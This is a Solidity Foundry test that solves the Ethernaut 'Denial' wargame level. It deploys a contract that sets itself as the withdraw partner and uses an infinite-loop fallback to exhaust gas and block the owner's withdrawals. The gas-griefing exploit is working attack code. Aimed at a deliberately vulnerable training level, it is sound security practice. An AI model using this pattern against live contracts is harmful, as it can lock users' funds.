// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "levels/Denial/Denial.sol";
import "levels/Denial/DenialFactory.sol";
import "./utils/EthernautTest.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialHack {
    IDenial public victim;

    constructor(address _targetAddress) {
        victim = IDenial(_targetAddress);
    }

    function exploit() external {
        victim.setWithdrawPartner(payable(address(this)));
    }

    fallback() external payable {
        while (true) {}
    }
}

contract DenialTest is Test {
    function test_denial() external {
        // Setup
        EthernautTest ethernautTest = new EthernautTest();
        DenialFactory denialFactory = new DenialFactory();
        address levelAddress = ethernautTest.setup(denialFactory);

        // Exploit
        vm.startPrank(tx.origin);
        DenialHack denialHack = new DenialHack(levelAddress);
        denialHack.exploit();
        vm.stopPrank();

        // Submit
        ethernautTest.submit();
    }
}
